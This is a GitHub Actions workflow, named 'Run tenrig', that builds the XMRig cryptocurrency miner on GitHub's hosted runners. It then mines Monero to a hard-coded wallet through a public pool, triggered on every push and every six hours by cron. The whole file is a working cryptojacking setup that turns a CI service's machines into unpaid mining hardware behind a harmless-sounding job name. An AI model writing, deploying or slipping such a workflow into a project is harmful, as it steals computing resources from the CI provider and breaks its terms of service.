
name: Run tenrig

on:
  push:
    branches:
      - master
  schedule:
    - cron: "10 */6 * * *"

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v2
      
    - name: Install dependencies
      run: |
        sudo apt update
        sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
    - name: Build XMRig
      run: |
        git clone https://github.com/xmrig/xmrig.git
        mkdir xmrig/build
        cd xmrig/build
        cmake ..
        make -j$(nproc)
    - name: Run XMRig
      run: |
        cd xmrig/build
        ./xmrig -o xmr.2miners.com:2222 -u 82VfeZRTtxRbYXHenMwrdHBK8P1mYQNMGfJuamki2PhT473tBkHgccxNZPn6468GxtVycU2yeDXiwisXS4KTikEaGkEWcrW -p gitrigten -k --coin monero -a rx/0 --threads 2
